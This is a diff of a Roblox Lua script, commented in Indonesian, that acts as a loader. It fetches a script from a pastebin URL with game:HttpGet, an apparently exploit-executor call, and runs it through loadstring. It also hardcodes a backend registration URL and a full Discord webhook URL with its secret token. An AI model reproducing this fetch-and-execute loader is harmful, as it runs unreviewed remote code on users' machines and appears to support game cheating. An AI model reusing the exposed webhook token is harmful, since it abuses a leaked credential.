@@ -2,7 +2,7 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
 -- ====================== [KONFIGURASI] ======================
-local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF" -- Ganti dengan URL script eksternal Anda
+local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"
 local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 local MAX_RETRIES = 3
@@ -14,13 +14,13 @@ local scriptCache = nil
 
 -- ====================== [FUNGSI] ======================
 
--- Ambil dan cache script eksternal
+-- Ambil dan cache script eksternal (via HttpGet agar bisa langsung di-execute)
 local function fetchScript()
     if scriptCache then return scriptCache end
 
     for attempt = 1, MAX_RETRIES do
         local success, result = pcall(function()
-            local response = HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
+            local response = game:HttpGet(EXTERNAL_SCRIPT_URL, true)
             assert(#response > 50, "Script terlalu pendek")
             return response
         end)
@@ -42,7 +42,8 @@ end
 
 -- Eksekusi script eksternal
 local function execute()
-    local loaded, err = loadstring(fetchScript())
+    local source = fetchScript()
+    local loaded, err = loadstring(source)
     if not loaded then error("Gagal load script: "..err) end
     return loaded()
 end
